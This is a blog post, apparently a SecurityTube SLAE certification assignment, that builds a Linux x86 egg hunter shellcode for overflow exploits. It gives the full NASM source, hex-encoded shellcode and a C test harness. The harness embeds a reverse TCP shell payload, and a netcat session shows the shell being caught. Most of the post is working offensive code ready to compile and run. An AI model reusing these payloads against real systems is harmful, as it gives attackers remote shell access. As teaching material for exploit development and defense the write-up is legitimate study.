---
layout: post
title: Creating an Egg Hunter
date: 2018-09-06
categories:
  - security
  - shellcoding
tags:
  - securitytube
  - slae
---
When exploiting overflows that allow code execution, there is near always a limit on how much code can be passed to the application. In some cases, this limitation can result in there not being enough space to carry out the desired action.

One method that can be used to circumvent this, is to use what is referred to as an "Egg Hunter". An egg hunter is a shellcode which will look for a specific pattern in memory (the egg) and will execute the shellcode that follows it.

How one would insert the egg and payload into the memory would be application specific. As long as the user can provide some input to the program and it be stored in a variable, then it would be possible to store data in memory.

Finding a Way to Enumerate Memory
---------------------------------
Initially, I created a very basic egg hunter which did the following:

* Loaded `0x00` into `$eax`
* Checked if the dword at `$eax` contains the egg
* If not, incremented `$eax` by one and tested again
* If it did, `jmp [$eax + 0x4]`

I soon found out that this was too naive an approach, and would not work; although fundamentally similar to what needs to be done.

The issue with taking this approach was that certain regions of memory cannot be accessed. Attempting to access the restricted areas of memory will result in the application crashing.

After doing some research, I found the [access(2)](https://linux.die.net/man/2/access) method. Although the purpose of the method is to check the user's permissions for a file, it's also possible to pass arbitrary memory locations to it and will return error codes, rather than throwing exceptions.

One of the errors that it handles and returns a code for is:

> EFAULT - pathname points outside your accessible address space.

To verify this would work, I modified my prototype to pass the current address being iterated to `access` and check the return value in `$eax`.

As can be seen in the GDB output below, when trying to access the memory at offset `0x1`, the return value in `$eax` was `0xfffffff2` - which is equal to `-14`:

```
[----------------------------------registers-----------------------------------]
EAX: 0xfffffff2
EBX: 0x1
ECX: 0x0
EDX: 0x0
ESI: 0xdeadbeef
EDI: 0x0
EBP: 0x0
ESP: 0xffffcab0 --> 0xdeadbeef
EIP: 0x8048084 (<test_next_byte+7>:	push   0x90)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
```

I then cross referenced this with the definition of `EFAULT`, which confirmed it is the value `14`:

```shell_session
$ grep -E -r "\s+EFAULT" /usr/include/
/usr/include/asm-generic/errno-base.h:#define	EFAULT		14	/* Bad address */
```

Beating the Bad Performance
---------------------------
After successfully testing `access`, I assumed my prototype would now work without a problem. Unfortunately, a new issue cropped up - the performance was **terrible**.

Virtual memory is split up into various sections, as can be seen in the illustration below (image courtesy of SecurityTube):

![](/assets/images/creating-an-egg-hunter/virtual-memory.jpg)

As the memory is segmented like this, I began to look into which sections could possibly be skipped or are known to not be readable. Whilst looking into this, I found [This StackExchange Post](https://unix.stackexchange.com/questions/128213/how-is-page-size-determined-in-virtual-address-space) which points out that in addition to the segments in the above illustration, memory is further split up into pages of a predefined size.

The accepted answer suggests that this value is typically 4096 bytes in Linux, and running the command suggested confirmed that on my system it was indeed 4096 bytes:

```
$ getconf PAGE_SIZE
4096
```

This information allowed for the shellcode's performance to be hugely increased. As if an address can not be read, rather than reading the subsequent 4095 bytes that will also be unreadable, the shellcode can just jump to the next page (i.e. 4096 bytes forward) and try the next page.

Problem solved! Or so I thought...

Escaping Access Errors: Part 2
------------------------------
Although the shellcode was now verifying that the next byte could be accessed, I hadn't appreciated initially that I need to read multiple bytes.

In order to check that the egg has been found, the shellcode needs to read up to 8 bytes ahead (initially I thought it would be 4 bytes, but more on that in the next section).

When running the egg hunter at this point, if the end of a readable page was reached, when it would be processing the third from final byte, it would result in an access error because:

1. The initial starting byte is accessible, and passes the check using `access`
2. The second and third byte are both accessible, as they are in the same page
3. The fourth byte falls into the next page, which is not accessible

An example of this happening can be seen in the GDB output below:

```
gdb-peda$ info registers
eax            0xfffffffe	0xfffffffe
ecx            0x0	0x0
edx            0x8048082	0x8048082
ebx            0x8048ffd	0x8048ffd
esp            0xffffcaac	0xffffcaac
ebp            0x0	0x0
esi            0xdeadbeef	0xdeadbeef
edi            0x0	0x0
eip            0x8048093	0x8048093 <test_next_byte+11>
eflags         0x10206	[ PF IF RF ]
cs             0x23	0x23
ss             0x2b	0x2b
ds             0x2b	0x2b
es             0x2b	0x2b
fs             0x0	0x0
gs             0x0	0x0
gdb-peda$ x/4xw $ebx
0x8048ffd:	Cannot access memory at address 0x8049000
gdb-peda$ x/1xb $ebx
0x8048ffd:	0x00
gdb-peda$ x/2xb $ebx
0x8048ffd:	0x00	0x00
gdb-peda$ x/3xb $ebx
0x8048ffd:	0x00	0x00	0x00
gdb-peda$ x/4xb $ebx
0x8048ffd:	0x00	0x00	0x00	Cannot access memory at address 0x8049000
```

This was the state of the registers at the time of the crash and as can be seen - each byte in `$ebx` can be read until attempting to read the 4th byte, which falls into the new page at `0x8049000`.

The resolution to this was to simply change the `access` call to check ahead of the current byte. If it wasn't possible to read the required number of bytes ahead, then the egg would definitely not be in the subsequent bytes, and the page could be moved forward.

Dealing with False Positives
----------------------------
The final issue I ran into, was that when looking for the egg `0xdeadbeef`, the egg hunter was finding the egg within itself and in other areas of the test program that the value was defined, as can be seen in the below GDB output:

```
[----------------------------------registers-----------------------------------]
EAX: 0xfffffffe
EBX: 0x8048070 (<_start+16>:	out    dx,eax)
ECX: 0x0
EDX: 0x0
ESI: 0xdeadbeef
EDI: 0x0
EBP: 0x0
ESP: 0xffffcab0 --> 0xdeadbeef
EIP: 0x8048092 (<test_next_byte+15>:	push   0x90)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)

Breakpoint 1, 0x08048092 in test_next_byte ()
gdb-peda$ x/4xw $ebx
0x8048070 <_start+16>:	0xdeadbeef	0xc931db31	0xadbeefbe	0xff9b8dde
```

The solution to this is quite simple - look for two repeating instances of the egg. By storing only a single instance of the value in the egg hunter, but two instances in the payload, the egg hunter would not find itself and presume it has found the payload.

Implementihng this did not require much more code - the look ahead with `access` needed to be changed to look 8 bytes ahead, a second comparison had to be added and instead of jumping 4 bytes from the initial byte being checked, the shellcode would need to jump 8 bytes instead.

Finalising the Shellcode
------------------------
Before finalising the shellcode, there was one remaining issue, which was null bytes being caused by the use of `lea` to move to the next page of memory, as can be seen in the below dump:

```nasm
8d 92 ff 0f 00 00    	lea    0xfff(%edx),%edx
```

By using the `or` operator instead, the null bytes can be removed. In addition to this, the pages can be navigated in a less error prone manner as it will result in the value being brought to the nearest multiple of `4095`, as opposed to adding `4095` on to the current value - which could result in a page being missed depending on the offset of the current byte.

To better illustrate this, see the Python output below. `100 OR 4095` will equal `4095`, and `5000 OR 4095` will equal `8191`:

```shell_session
>>> int(100 | 0xfff)
4095
>>> int(4094 | 0xfff)
4095
>>> int(5000 | 0xfff)
8191
```

As the desired effect is to always move to the **start** of the next page, this ensures that the starting byte always moves to the closest page; as opposed to the end of a page.

The end result of the research and the aforementioned problem solving is the below shellcode, weighing in at 46 bytes:

```nasm
global _start

section .text
  _start:
    ; clear the required registers and store the egg
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx
    mov   esi, 0xdeadbeef

  move_to_next_page:
    ; move $edx forward 4095 bytes
    or    dx, 0xfff

  test_next_byte:
    ; load the next byte
    inc   edx

    ; check if the next 8 bytes of memory are accessible
    xor   eax, eax
    mov   al, 0x21
    lea   ebx, [edx + 0x8]
    int   0x80

    ; if the result is EFAULT, the memory
    ; can't be accessed. Move to the next page.
    cmp   al, 0xf2
    je    short move_to_next_page

    ; if the jump wasn't made, the memory
    ; can be accessed. Check if the value
    ; it points to contains the egg.
    cmp   [edx], esi
    jnz   short test_next_byte

    ; if an instance of the egg was found
    ; check if it is appears in the next
    ; dword. If it does, it is a match.
    lea   ebx, [edx + 0x4]
    cmp   [ebx], esi
    jnz   short test_next_byte

    ; if a second instance of the egg was
    ; found, we've found the shellcode and
    ; can execute it.
    lea   edx, [ebx + 0x4]
    jmp   edx
```

In order to test this, I modified the C program that has been used in the previous SLAE blog posts to include both the egg hunter above, and the previously used reverse TCP shellcode.

The only modification to the shellcode is to precede it with two instances of the egg (`\xef\xbe\xad\xde`) so it can be found by the egg hunter:

```c
#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = "\x31\xdb\x31\xc9\x31\xd2\xbe\xef\xbe\xad\xde\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x32\x75\xee\x8d\x5a\x04\x39\x33\x75\xe7\x8d\x53\x04\xff\xe2";
unsigned char shellcode[] = "\xef\xbe\xad\xde\xef\xbe\xad\xde\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x2\x2\x2\x2\xbb\x7d\x2\x2\x3\x31\xc3\x53\x66\x68\x11\x5c\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

int main(void)
{
    printf("Egg hunter length: %d\n", strlen(egghunter));
    printf("Shellcode length: %d\n", strlen(shellcode));

    void (*s)() = (void *)egghunter;
    s();

    return 0;
}
```

As with previous incarnations of this C program, it can be compiled by running: `gcc -m32 -fno-stack-protector -z execstack egghunter.c -o egghunter`

After starting a netcat listener and running the egghunter executable, the shellcode was successfully found and executed - providing a reverse shell:

```shell_session
$ nc -vlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from localhost 40976 received!
pwd
/home/rastating/Code/slae/assignment_3
netstat -an | grep "4444"
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:40976         127.0.0.1:4444          ESTABLISHED
tcp        0     26 127.0.0.1:4444          127.0.0.1:40976         ESTABLISHED
```

<hr />

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/).

Student ID: SLAE-1340

All source files can be found on GitHub at [https://github.com/rastating/slae](https://github.com/rastating/slae)
